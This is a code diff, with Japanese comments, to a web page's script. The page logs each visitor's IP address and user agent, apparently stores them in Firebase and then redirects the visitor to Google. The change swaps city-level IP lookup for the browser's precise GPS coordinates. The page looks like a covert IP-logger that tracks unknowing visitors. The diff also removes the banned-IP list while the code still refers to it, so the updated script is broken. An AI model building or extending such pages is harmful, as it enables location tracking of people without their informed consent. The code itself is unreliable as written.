@@ -30,10 +30,7 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // IP BANリスト
-        const bannedIPs = ['180.199.223.65', '180.199.223.5']; // BANしたいIPアドレスをここに追加
-
-        // IPアドレスを取得し、処理を実行
+        // IPアドレスを取得
         fetch('https://ipinfo.io?callback')
             .then(res => res.text())
             .then(data => {
@@ -46,10 +43,9 @@
                 document.getElementById("userAgent").textContent = userAgent;
 
                 // 位置情報を取得
-                fetch(`https://ipinfo.io/${ip}/json`)
-                    .then(res => res.json())
-                    .then(data => {
-                        const location = data.city + ', ' + data.region;
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        const location = `${position.coords.latitude}, ${position.coords.longitude}`;
                         document.getElementById("location").textContent = location;
 
                         // 現在の時間を取得
@@ -76,16 +72,22 @@
                                 console.error('データの送信中にエラーが発生しました: ', error);
                             });
 
-                        // IPがBANされていない場合、Googleにリダイレクト
+                        // IPがBANされている場合、BANページにリダイレクト
                         if (bannedIPs.includes(ip)) {
                             window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html';
                         } else {
+                            // IPがBANされていない場合、Googleにリダイレクト
                             window.location.href = 'https://www.google.com';
                         }
-                    })
-                    .catch(error => {
-                        console.error('位置情報の取得中にエラーが発生しました: ', error);
                     });
+                } else {
+                    // ブラウザが位置情報をサポートしていない場合、データを送信せずにリダイレクト
+                    if (bannedIPs.includes(ip)) {
+                        window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html';
+                    } else {
+                        window.location.href = 'https://www.google.com';
+                    }
+                }
             })
             .catch(error => {
                 console.error('IPアドレスの取得中にエラーが発生しました: ', error);
